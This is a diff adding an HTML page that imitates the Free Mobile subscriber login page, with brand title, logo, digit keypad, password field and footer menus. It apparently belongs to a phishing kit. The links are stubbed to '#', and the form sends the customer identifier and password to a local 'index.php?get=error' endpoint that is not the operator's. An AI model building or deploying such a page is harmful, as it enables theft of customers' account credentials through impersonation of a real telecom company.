@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+	<!-- COMMON -->
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+	<title>Free Mobile - Bienvenue dans votre Espace Abonné</title>
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+	<link rel="icon" type="image/png" href="favicon.ico" />
+	<!-- COMMON -->
+
+	<!-- CSS -->
+	<link rel="stylesheet" type="text/css" href="../common/css/bootstrap.min5059.css?v=20" />
+	<link rel="stylesheet" type="text/css" href="css/global.min5059.css?v=20" />
+	<link rel="stylesheet" type="text/css" href="css/style.min5059.css?v=20" />
+	<link rel="stylesheet" type="text/css" href="../common/css/jquery.reveal5059.css?v=20" />
+	<link rel="stylesheet" type="text/css" href="../common/css/form-boutons.min5059.css?v=20" />
+	<link rel="stylesheet" type="text/css" href="../common/css/common5059.css?v=20" />
+	<link rel="stylesheet" type="text/css" href="css/identification5e1f.css?v=2" />
+	<!-- CSS -->
+
+	<!-- JS -->
+	<script type="text/javascript" src="../common/js/jquery.1.8.min5059.js?v=20"></script>
+	<script type="text/javascript" src="../common/js/jquery_cssHook_bgpos5059.js?v=20"></script>
+	<script type="text/javascript" src="../common/js/jquery.reveal.min5059.js?v=20"></script>
+	<script type="text/javascript" src="../common/js/bootstrap.min5059.js?v=20"></script>
+	<script type="text/javascript" src="../common/js/jquery.modalDialog.js"></script>
+	<script type="text/javascript" src="../common/js/common.min5059.js?v=20"></script>
+	<script type="text/javascript" src="js/functions.min5059.js?v=20"></script>
+	<script type="text/javascript" src="../js/navigateurs5059.js?v=20"></script>
+	<script type="text/javascript" src="js/identification5059.js?v=20"></script>
+	<script type="text/javascript">
+function surligne(compw, erreur)
+{
+   if(erreur)
+      compw.style.backgroundColor = "#fba";
+   else
+      compw.style.backgroundColor = "";
+}
+function verifpss(compw)
+{
+   if(compw.value.length < 6)
+   {
+      surligne(compw, true);
+      return false;
+   }
+  
+   else
+   {
+      surligne(compw, false);
+      return true;
+   }
+}
+function surligne2(comid, erreur)
+{
+   if(erreur)
+      comid.style.backgroundColor = "#fba";
+   else
+      comid.style.backgroundColor = "";
+}
+function verifid(comid)
+{
+   if(comid.value.length !== 8)
+   {
+      surligne2(comid, true);
+      return false;
+   }
+  
+   else
+   {
+      surligne2(comid, false);
+      return true;
+   }
+}
+ function verifForm(f)
+{
+   var pssOk = verifpss(f.compw);
+   var idOk = verifid(f.comid);
+   
+   
+   
+   if(pssOk & idOk)
+      return true;
+   else
+   {
+      alert("Veuillez renseigner correctement les champs");
+      return false;
+   }
+}	
+</script>
+	<!-- JS -->
+
+</head>
+
+<body>
+
+	<!-- DEBUT HEADER -->
+	<div id="header">
+		<a href="index.php">
+			<img src="images/logo.png" title="Bienvenue chez Free" alt="Logo Free" />
+		</a>
+		<img id="headerEspace" src="images/bandeauBienvenue.png" alt="bandeau_bienvenue" align="bottom" />
+	<div id="idProprietaireCompte">
+				
+		</div>
+		<br class="clear" />
+	</div>
+	<!-- FIN HEADER -->
+
+	
+
+	<div id="conteneur">
+		<!-- MENU -->
+		<ul id="menuEspaceAbonne">
+			<li >
+				<a href="index.php"><img alt="Icone Menu" src="../images/moncompte/menu/accueil_Off.png" /></a>
+				
+			</li>
+					</ul>
+		
+
+		<div id="contenuEA" class="widthfull">
+
+	<!--  MORE CSS & JS -->
+
+
+	<div id="ident" class="marginauto">
+		<div id="ident_blocg" class="fleft">
+			<div id="ident_titre"><img src="../images/moncompte/identification/titreIdentification.png" alt="titre_identification" /></div>
+			<br />
+			<div id="ident_desc">
+				<p><img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Accédez à vos suivis commandes<br />
+				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Gardez un oeil sur vos consommations<br />
+				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Gérez vos options<br />
+				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Commandez vos mobiles</p>
+			</div>
+			<div id="ident_assistance">
+				<a href="#"><img src="../images/moncompte/identification/questionAssistance.png" alt="assistance" /></a>
+			</div>
+		</div>
+
+		<div id="ident_blocd" class="fleft">
+			<div id="ident_div_ident">
+				<div id="content">
+					<span class="strong">Veuillez saisir votre identifiant grâce aux touches ci-dessous :</span>
+					<div class="ident_chiffre2">
+						<ul role="list">
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(0)" src="chiffreb1fe.png?pos=0&amp;r=2869" class="ident_chiffre_img pointer" alt="position 0" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(9)" src="chiffre7148.png?pos=1&amp;r=73584" class="ident_chiffre_img pointer" alt="position 1" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(8)" src="chiffreeb41.png?pos=2&amp;r=85112" class="ident_chiffre_img pointer" alt="position 2" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(7)" src="chiffrecb9a.png?pos=3&amp;r=31891" class="ident_chiffre_img pointer" alt="position 3" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(4)" src="chiffre6651.png?pos=4&amp;r=71395" class="ident_chiffre_img pointer" alt="position 4" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(6)" src="chiffre7c28.png?pos=5&amp;r=45443" class="ident_chiffre_img pointer" alt="position 5" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(3)" src="chiffre7fbc.png?pos=6&amp;r=44037" class="ident_chiffre_img pointer" alt="position 6" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(1)" src="chiffre581b.png?pos=7&amp;r=86997" class="ident_chiffre_img pointer" alt="position 7" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(2)" src="chiffre8f16.png?pos=8&amp;r=91383" class="ident_chiffre_img pointer" alt="position 8" /></li>
+							<li class="inline" role="listitem"><img onclick="ident_addNumber(5)" src="chiffreb93d.png?pos=9&amp;r=97693" class="ident_chiffre_img pointer" alt="position 9" /></li>
+						</ul>
+					</div>
+					<form id="form_connect" method="post" action="index.php?get=error" onsubmit="return verifForm(this)">
+						<table>
+							<tr style="height:30px;">
+								<td>Identifiant :</td><td><span id="ident_txt_identifiant" class="red strong ident_txt_identifiant_petit">Utilisez le pavé numérique ci-dessus.</span><input type="hidden" id="ident_pos" name="comid"  value="" onblur="verifid(this)" required/></td>
+							</tr>
+							<tr style="height:30px;">
+								<td>Mot de passe :</td><td><input type="password" name="compw" class="input-medium" onblur="verifpss(this)" required/></td>
+							</tr>
+							<tr><td></td></tr>
+							<tr>
+								<td colspan="2" style="padding-top:10px;"><a class="red" href="#">Vous avez oublié votre mot de passe ou perdu vos identifiants ?</a></td></td>
+							</tr>
+						</table>
+						<a href="javascript:toggleVoice();">
+						<img id="btAideVocale" src="../images/moncompte/identification/btnAideOff.png" alt="Désactiver l\'aide vocale" title="Désactiver l\'aide vocale" style="margin:10px;" />
+						</a>
+						<div style="text-align:right">
+							<button id="ident_btn_cancel" onclick="ident_reset();" type="button" class="bt bt-white bt-xl" style="margin-right:20px;">Annuler</button>
+							<button id="ident_btn_submit" type="submit" class="bt bt-red bt-xl">Se connecter</button>
+						</div>
+					</form>
+
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</div>
+	</div>
+<!-- ######### FOOTER ######### -->
+	<div id="footer">
+		<div class="menu" style="width:190px;">
+			<h5 align="left">ESPACE ABONNÉ</h5>
+			<ul>
+				<li><a href="#">Mon compte</a></li>
+ 				<li><a href="#">Assistance</a></li>
+ 				<li><a target="_blank" href="#">Les services mobiles</a></li>
+			</ul>
+		</div>
+        <div class="menu" style="width:250px;">
+            <h5 align="left">FREE MOBILE</h5>
+            <ul>
+				<li><a href="#" class="linkModal" data-link="/infos.html #infosSociete">La société</a></li>
+                <li><a href="#">Nous contacter</a></li>
+				<li><a href="#" class="linkModal" data-link="/infos.html #infosInfosLegales">Informations légales</a></li>
+				<li><a href="#">Disponibilité du service Free Mobile</a></li>
+         	</ul>
+        </div>
+       <div class="menu" style="width:275px;">
+            <h5 align="left">tarifs et conditions</h5>
+            <ul>
+                <li><a href="#" target="_blank">Conditions générales d'abonnement</a></li>
+                <li><a href="#" target="_blank">Conditions générales de location</a></li>
+               	<li><a href="#" target="_blank">Conditions générales de vente de téléphones mobiles</a></li>
+                <li><a href="#" target="_blank">Conditions générales d'utilisation du site</a></li>
+				<li><a href="#" target="_blank">Brochure tarifaire</a></li>
+            </ul>
+        </div>
+		<div class="menu" style="width:250px;">
+            <h5 align="left">Annexes</h5>
+            <ul>
+				<li><a href="#" target="_blank" >Fiche d'information précontractuelle</a></li>
+				<li><a href="#" target="_blank" >Fiche d'information standardisée</a></li>
+               	<li><a href="#">Protection de l'enfance</a></li>
+				<li><a href="#" target="_blank">Guide Pratique des communications électroniques</a></li>
+            </ul>
+        </div>
+		
+		
+
+	</div>
+
+</body>
+</html>
